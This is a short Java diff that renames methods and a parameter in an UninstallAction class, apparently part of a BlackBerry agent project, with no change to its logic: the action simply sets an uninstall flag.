@@ -11,11 +11,11 @@ import com.ht.rcs.blackberry.utils.Check;
 
 public class UninstallAction extends SubAction {
 
-    public UninstallAction(int actionId, byte[] confParams) {
-        super(actionId);
-        Parse(confParams);
+    public UninstallAction(int actionId_, byte[] confParams) {
+        super(actionId_);
+        parse(confParams);
 
-        Check.requires(ActionId == ACTION_UNINSTALL, "ActionId scorretto");
+        Check.requires(actionId == ACTION_UNINSTALL, "ActionId scorretto");
 
     }
 
@@ -24,13 +24,13 @@ public class UninstallAction extends SubAction {
 
     }
 
-    public boolean Execute() {
+    public boolean execute() {
 
         this.wantUninstall = true;
         return false;
     }
 
-    protected boolean Parse(byte[] confParams) {
+    protected boolean parse(byte[] confParams) {
 
         return true;
     }
